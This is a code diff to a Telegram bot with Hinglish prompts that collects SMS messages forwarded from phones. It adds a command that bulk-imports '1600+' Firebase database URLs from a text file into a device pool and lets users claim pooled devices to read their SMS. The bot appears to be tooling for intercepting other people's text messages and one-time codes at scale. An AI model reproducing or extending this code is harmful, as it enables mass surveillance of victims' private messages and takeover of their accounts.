@@ -3,12 +3,13 @@ from datetime import datetime, timezone
 
 from sqlalchemy.orm import Session
 from telegram import Update
-from telegram.ext import Application, CommandHandler, ContextTypes
+from telegram.ext import Application, CommandHandler, ContextTypes, MessageHandler, filters
 
 from app.config import get_settings
 from app.database import Device, SMSMessage, SessionLocal
+from app.bulk_firebase import bulk_import_from_txt
 from app.services import (
-    claim_device,
+    claim_pool_device,
     device_status,
     get_monitoring_user_ids,
     list_devices_with_counts,
@@ -22,6 +23,7 @@ from app.services import (
 
 logger = logging.getLogger(__name__)
 settings = get_settings()
+AWAITING_FIREBASE_TXT = "awaiting_firebase_txt"
 
 
 def is_authorized(user_id: int | None) -> bool:
@@ -95,6 +97,7 @@ async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> N
         "/startmonitar - SMS forwarding start\n"
         "/stopmonitar - SMS forwarding stop\n"
         "/setfirebase <url> - Firebase attach karo\n"
+        "/allfirebase - Txt file se 1600+ Firebase import\n"
         "/a <deviceid> - Apni device add/claim karo\n"
         "/devices - Apni saari devices dekho\n"
         "/device <name> - Ek device ke SMS dekho\n"
@@ -121,7 +124,8 @@ async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> No
         "/stopmonitar - Forwarding band karo\n\n"
         "*Firebase:*\n"
         "/setfirebase https://project.firebaseio.com\n"
-        "/devices - Firebase ki saari devices dikhegi\n\n"
+        "/allfirebase - txt file bhejo bulk import ke liye\n"
+        "/a deviceid - pool se device claim karo\n\n"
         "*Device commands:*\n"
         "/a myphone - Apni device add/claim karo\n"
         "/devices - Meri devices list\n"
@@ -216,6 +220,86 @@ async def stopmonitar_command(update: Update, context: ContextTypes.DEFAULT_TYPE
     )
 
 
+async def allfirebase_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    user = update.effective_user
+    if not is_authorized(user.id if user else None):
+        return
+
+    context.user_data[AWAITING_FIREBASE_TXT] = True
+    await update.message.reply_text(
+        "📄 *Bulk Firebase Import*\n\n"
+        "Ab `.txt` file attach karo.\n\n"
+        "*Supported formats (har line):*\n"
+        "`deviceid`\n"
+        "`deviceid|https://firebase-url.com`\n"
+        "`https://firebase-url.com`\n\n"
+        "Import ke baad `/a <deviceid>` se device claim karo.",
+        parse_mode="Markdown",
+    )
+
+
+async def firebase_txt_upload_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    user = update.effective_user
+    if not user or not context.user_data.get(AWAITING_FIREBASE_TXT):
+        return
+    if not is_authorized(user.id):
+        return
+
+    document = update.message.document
+    if not document:
+        return
+
+    filename = (document.file_name or "").lower()
+    if not filename.endswith(".txt"):
+        await update.message.reply_text("❌ Sirf `.txt` file bhejo.")
+        return
+
+    context.user_data[AWAITING_FIREBASE_TXT] = False
+    status_msg = await update.message.reply_text("⏳ Txt file read ho rahi hai...")
+
+    try:
+        telegram_file = await document.get_file()
+        raw = await telegram_file.download_as_bytearray()
+        content = raw.decode("utf-8", errors="ignore")
+    except Exception as exc:
+        await status_msg.edit_text(f"❌ File read error: {exc}")
+        return
+
+    db: Session = SessionLocal()
+
+    async def on_progress(done: int, total: int, imported: int) -> None:
+        try:
+            await status_msg.edit_text(
+                f"⏳ Import ho raha hai...\n"
+                f"Lines: {done}/{total}\n"
+                f"Devices: {imported}"
+            )
+        except Exception:
+            pass
+
+    try:
+        result = await bulk_import_from_txt(db, content, live_fetch=True, on_progress=on_progress)
+    except ValueError as exc:
+        await status_msg.edit_text(f"❌ {exc}")
+        return
+    except Exception as exc:
+        logger.error("Bulk firebase import failed: %s", exc)
+        await status_msg.edit_text(f"❌ Import failed: {exc}")
+        return
+    finally:
+        db.close()
+
+    await status_msg.edit_text(
+        f"✅ *Bulk Import Complete!*\n\n"
+        f"📄 Lines processed: *{result['lines']}*\n"
+        f"📱 Devices imported: *{result['imported']}*\n"
+        f"❌ Failed: *{result['failed']}*\n"
+        f"🗂️ Pool total: *{result['pool_total']}*\n\n"
+        f"Ab claim karo: `/a <deviceid>`",
+        parse_mode="Markdown",
+    )
+
+
 async def setfirebase_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     user = update.effective_user
     if not is_authorized(user.id if user else None):
@@ -267,11 +351,19 @@ async def a_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
         return
 
     if not context.args:
+        pool_count = 0
+        db: Session = SessionLocal()
+        try:
+            pool_count = db.query(Device).filter(Device.owner_telegram_id.is_(None)).count()
+        finally:
+            db.close()
         await update.message.reply_text(
             "Usage: `/a <deviceid>`\n\n"
             "Example:\n"
+            "`/a device001`\n"
             "`/a redmi-note-12`\n"
-            "`/a 3`",
+            f"`/a 3`\n\n"
+            f"🗂️ Pool mein *{pool_count}* devices available hain.",
             parse_mode="Markdown",
         )
         return
@@ -279,12 +371,19 @@ async def a_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     deviceid = context.args[0]
     db: Session = SessionLocal()
     try:
-        device, created = claim_device(db, deviceid, user.id)
+        device, created = claim_pool_device(db, deviceid, user.id)
         sms_count = (
             db.query(SMSMessage)
             .filter(SMSMessage.device_id == device.id)
             .count()
         )
+    except LookupError:
+        await update.message.reply_text(
+            f"❌ Device `{deviceid}` pool mein nahi mili.\n"
+            f"Pehle `/allfirebase` se txt import karo.",
+            parse_mode="Markdown",
+        )
+        return
     except PermissionError:
         await update.message.reply_text("❌ Ye device kisi aur user ki hai.")
         return
@@ -504,7 +603,9 @@ def build_telegram_app() -> Application | None:
     app.add_handler(CommandHandler("mynum", mynum_command))
     app.add_handler(CommandHandler("startmonitar", startmonitar_command))
     app.add_handler(CommandHandler("stopmonitar", stopmonitar_command))
+    app.add_handler(CommandHandler("allfirebase", allfirebase_command))
     app.add_handler(CommandHandler("setfirebase", setfirebase_command))
+    app.add_handler(MessageHandler(filters.Document.ALL, firebase_txt_upload_handler))
     app.add_handler(CommandHandler("a", a_command))
     app.add_handler(CommandHandler("devices", devices_command))
     app.add_handler(CommandHandler("device", device_command))
